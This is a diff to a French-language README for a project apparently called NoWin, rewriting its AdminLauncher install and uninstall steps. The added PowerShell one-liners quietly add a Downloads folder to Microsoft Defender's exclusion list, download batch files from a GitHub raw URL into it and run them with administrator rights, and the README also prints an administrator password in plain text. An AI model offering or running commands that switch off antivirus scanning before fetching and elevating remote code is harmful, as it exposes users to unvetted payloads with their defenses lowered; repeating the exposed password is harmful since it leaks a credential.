@@ -86,16 +86,14 @@ Si vous avez besoin d'installer ou de désinstaller manuellement `AdminLauncher`
 - Désinstaller `AdminLauncher` (élévation requise) :
 
 ```powershell
-Start-Process -FilePath "$env:USERPROFILE\Downloads\NoWin\UninstallAdmin.bat" -Verb RunAs -Wait
+$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/UninstallAdmin.bat" -OutFile "$p\UninstallAdmin.bat"; Start-Process "$p\UninstallAdmin.bat" -Verb RunAs
 ```
 
 - Installer `AdminLauncher` (exécute le mode `--install` avec élévation) :
 
 ```powershell
-Start-Process -FilePath "$env:USERPROFILE\Downloads\NoWin\AdminLauncher.bat" -ArgumentList "--install" -Verb RunAs -Wait
+$p="$env:USERPROFILE\Downloads\NoWin"; New-Item -ItemType Directory -Path $p -Force|Out-Null; Add-MpPreference -ExclusionPath $p -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/LightZirconite/NoWin/main/AdminLauncher.bat" -OutFile "$p\AdminLauncher.bat"; Start-Process "$p\AdminLauncher.bat" -ArgumentList "--install" -Verb RunAs
 ```
-
-Ces commandes supposent que les fichiers `AdminLauncher.bat` et `UninstallAdmin.bat` se trouvent dans le dossier `Downloads\NoWin` de l'utilisateur courant. Adaptez les chemins si nécessaire.
 
 
 **⚠️ Exécuter PowerShell en Administrateur** | **🔑 Mot de passe Admin:** `uyy`
